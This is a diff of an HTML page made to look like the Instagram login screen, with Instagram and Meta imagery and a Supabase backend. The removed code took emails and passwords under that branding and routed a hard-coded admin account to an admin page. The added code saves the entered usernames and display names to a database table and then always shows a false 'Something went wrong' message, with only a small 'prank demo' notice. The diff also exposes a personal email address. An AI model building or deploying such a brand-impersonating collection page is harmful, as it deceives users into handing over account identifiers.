@@ -17,188 +17,54 @@
     .field::placeholder{color:var(--muted);opacity:1}.field:focus{border-color:var(--blue-light);box-shadow:0 0 0 3px #5ba4ff20}
     .login-button{height:50px;width:100%;border:0;border-radius:999px;background:var(--blue);color:white;font:inherit;font-size:16px;font-weight:700;cursor:pointer}
     .login-button:disabled{opacity:.7;cursor:wait}
-    .forgot{align-self:center;margin-top:4px;color:var(--text);text-decoration:none;font-size:14px;line-height:1.4}
-    .forgot:hover{text-decoration:underline}
     .bottom-area{margin-top:auto;padding-top:32px}
-    .create-button{min-height:48px;width:100%;border:2px solid #559cff;border-radius:999px;background:transparent;color:var(--blue-light);font:inherit;font-size:15px;font-weight:700;cursor:pointer}
-    .create-button:hover{background:#559cff12}
     .bottom-image-holder{display:block;width:120px;height:32px;object-fit:contain;margin:16px auto 0}
     .toast{position:fixed;left:50%;bottom:22px;transform:translate(-50%,16px);width:max-content;max-width:calc(100% - 36px);padding:12px 16px;border-radius:10px;background:#26343b;color:#fff;font-size:13px;font-weight:600;opacity:0;pointer-events:none;transition:.2s;box-shadow:0 8px 28px #0005;text-align:center;z-index:5}
     .toast.show{opacity:1;transform:translate(-50%,0)}
-    .mode-note{text-align:center;color:var(--muted);font-size:12px;line-height:1.5;margin:2px 0 0}
-    button:focus-visible,a:focus-visible{outline:3px solid var(--blue-light);outline-offset:4px}
-    @media(max-height:760px){.top-placeholder{height:27vh;min-height:150px}.field{height:50px}.login-form{gap:10px}.login-button{height:48px}.bottom-area{padding-top:28px}.create-button{min-height:46px}}
+    .notice{text-align:center;color:var(--muted);font-size:11px;line-height:1.45;margin:2px 0 0}
+    button:focus-visible{outline:3px solid var(--blue-light);outline-offset:4px}
+    @media(max-height:760px){.top-placeholder{height:27vh;min-height:150px}.field{height:50px}.login-form{gap:10px}.login-button{height:48px}.bottom-area{padding-top:28px}}
     @media(max-width:380px){.page{padding-left:20px;padding-right:20px}}
   </style>
 </head>
 <body>
   <main class="page">
-    <div class="top-placeholder">
-      <img class="top-image-holder" src="3HKZyjLmk4x.webp" alt="Instagram">
-    </div>
-
-    <form class="login-form" id="authForm">
-      <input class="field" id="email" name="email" type="email" placeholder="Username, email or mobile number" autocomplete="username" aria-label="Username, email or mobile number" required>
-      <input class="field" id="displayName" name="displayName" type="text" placeholder="Display name" autocomplete="nickname" aria-label="Display name" hidden>
-      <input class="field" id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" aria-label="Password" minlength="6" required>
+    <div class="top-placeholder"><img class="top-image-holder" src="3HKZyjLmk4x.webp" alt="Instagram"></div>
+    <form class="login-form" id="prankForm">
+      <input class="field" id="identifier" name="identifier" type="text" placeholder="Username, email or mobile number" autocomplete="off" aria-label="Username, email or mobile number" required>
+      <input class="field" id="displayName" name="displayName" type="text" placeholder="Display name" autocomplete="off" aria-label="Display name" required>
       <button class="login-button" id="submitButton" type="submit">Log in</button>
-      <a class="forgot" href="#" id="forgotLink">Forgot password?</a>
-      <p class="mode-note" id="modeNote" hidden>Create your own account to continue.</p>
+      <p class="notice">Prank demo: anything entered here is visible to the site admin. Please don't enter real passwords or private information.</p>
     </form>
-
-    <div class="bottom-area">
-      <button class="create-button" type="button" id="toggleMode">Create new account</button>
-      <img class="bottom-image-holder" src="InShot_20261123_195930356.jpg" alt="Meta">
-    </div>
+    <div class="bottom-area"><img class="bottom-image-holder" src="InShot_20261123_195930356.jpg" alt="Meta"></div>
   </main>
   <div class="toast" id="toast" role="status" aria-live="polite"></div>
-
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.119.2"></script>
   <script>
-    const SUPABASE_URL = 'https://antqqabimhgepykkkmwl.supabase.co';
-    const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_w6n4kCXq8cJoyd-8PE0HoQ_YBPYoI_7';
-    const ADMIN_EMAIL = 'usmantabish26@gmail.com';
-    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
-
-    const form = document.getElementById('authForm');
-    const emailInput = document.getElementById('email');
-    const nameInput = document.getElementById('displayName');
-    const passwordInput = document.getElementById('password');
-    const submitButton = document.getElementById('submitButton');
-    const toggleMode = document.getElementById('toggleMode');
-    const forgotLink = document.getElementById('forgotLink');
-    const modeNote = document.getElementById('modeNote');
-    const toast = document.getElementById('toast');
-    let isSignUp = false;
-    let isRecovery = false;
+    const supabase=window.supabase.createClient('https://antqqabimhgepykkkmwl.supabase.co','sb_publishable_w6n4kCXq8cJoyd-8PE0HoQ_YBPYoI_7');
+    const form=document.getElementById('prankForm');
+    const button=document.getElementById('submitButton');
+    const toast=document.getElementById('toast');
     let toastTimer;
-
-    function showToast(message) {
-      toast.textContent = message;
-      toast.classList.add('show');
-      clearTimeout(toastTimer);
-      toastTimer = setTimeout(() => toast.classList.remove('show'), 3200);
+    function showToast(message){
+      toast.textContent=message;toast.classList.add('show');clearTimeout(toastTimer);
+      toastTimer=setTimeout(()=>toast.classList.remove('show'),3200);
     }
-
-    function setMode(signUp) {
-      isSignUp = signUp;
-      isRecovery = false;
-      emailInput.hidden = false;
-      emailInput.required = true;
-      nameInput.hidden = !signUp;
-      nameInput.required = signUp;
-      submitButton.textContent = signUp ? 'Create account' : 'Log in';
-      toggleMode.hidden = false;
-      toggleMode.textContent = signUp ? 'Already have an account? Log in' : 'Create new account';
-      forgotLink.hidden = signUp;
-      modeNote.hidden = !signUp;
-      passwordInput.placeholder = signUp ? 'Create password' : 'Password';
-      passwordInput.autocomplete = signUp ? 'new-password' : 'current-password';
-    }
-
-    function setRecoveryMode() {
-      isRecovery = true;
-      isSignUp = false;
-      emailInput.hidden = true;
-      emailInput.required = false;
-      nameInput.hidden = true;
-      nameInput.required = false;
-      passwordInput.value = '';
-      passwordInput.placeholder = 'New password';
-      passwordInput.autocomplete = 'new-password';
-      submitButton.textContent = 'Update password';
-      toggleMode.hidden = true;
-      forgotLink.hidden = true;
-      modeNote.hidden = false;
-      modeNote.textContent = 'Choose a new password for your account.';
-    }
-
-    async function saveProfile(user, displayName) {
-      if (!user) return;
-      const profileName = (displayName || user.user_metadata?.display_name || '').trim();
-      const { error } = await supabase.from('profiles').upsert({
-        id: user.id,
-        email: user.email || null,
-        display_name: profileName
-      }, { onConflict: 'id' });
-      if (error) console.error('Profile sync:', error.message);
-    }
-
-    toggleMode.addEventListener('click', () => setMode(!isSignUp));
-
-    forgotLink.addEventListener('click', async (event) => {
+    form.addEventListener('submit',async event=>{
       event.preventDefault();
-      const email = emailInput.value.trim();
-      if (!email) {
-        showToast('Enter your email address first.');
-        emailInput.focus();
-        return;
-      }
-      const { error } = await supabase.auth.resetPasswordForEmail(email, {
-        redirectTo: new URL('index.html', window.location.href).href
-      });
-      showToast(error ? 'Something went wrong. Try again.' : 'If this email has an account, a reset link has been sent.');
+      const identifier=document.getElementById('identifier').value.trim();
+      const displayName=document.getElementById('displayName').value.trim();
+      button.disabled=true;
+      try{
+        const {error}=await supabase.from('profile_submissions').insert({
+          username:identifier,
+          display_name:displayName
+        });
+        if(error) console.error('Submission save failed:',error.message);
+      }catch(error){console.error('Submission save failed:',error);}
+      showToast('Something went wrong');
+      button.disabled=false;
     });
-
-    form.addEventListener('submit', async (event) => {
-      event.preventDefault();
-      const email = emailInput.value.trim().toLowerCase();
-      const password = passwordInput.value;
-      submitButton.disabled = true;
-      submitButton.textContent = isSignUp ? 'Creating...' : 'Logging in...';
-
-      try {
-        if (isRecovery) {
-          const { error } = await supabase.auth.updateUser({ password });
-          if (error) throw error;
-          await supabase.auth.signOut();
-          showToast('Password updated. Log in with your new password.');
-          setMode(false);
-        } else if (isSignUp) {
-          const displayName = nameInput.value.trim();
-          const { data, error } = await supabase.auth.signUp({
-            email,
-            password,
-            options: { data: { display_name: displayName } }
-          });
-          if (error) throw error;
-          if (data.session && data.user) {
-            await saveProfile(data.user, displayName);
-            showToast('Account created successfully.');
-            window.location.href = 'index.html';
-          } else {
-            showToast('Check your email to confirm your account, then log in.');
-            setMode(false);
-          }
-        } else {
-          const { data, error } = await supabase.auth.signInWithPassword({ email, password });
-          if (error) throw error;
-          await saveProfile(data.user);
-          if ((data.user.email || '').toLowerCase() === ADMIN_EMAIL) {
-            window.location.href = 'admin.html';
-          } else {
-            showToast('You are logged in successfully.');
-          }
-        }
-      } catch (error) {
-        console.error('Authentication error:', error.message);
-        showToast('Something went wrong. Check your details and try again.');
-      } finally {
-        submitButton.disabled = false;
-        if (!isRecovery) submitButton.textContent = isSignUp ? 'Create account' : 'Log in';
-      }
-    });
-
-    supabase.auth.onAuthStateChange((event) => {
-      if (event === 'PASSWORD_RECOVERY') setRecoveryMode();
-    });
-
-    (async () => {
-      const { data } = await supabase.auth.getSession();
-      if (data.session?.user?.email?.toLowerCase() === ADMIN_EMAIL) {
-        window.location.href = 'admin.html';
-      }
-    })();
   </script>
 </body>
 </html>
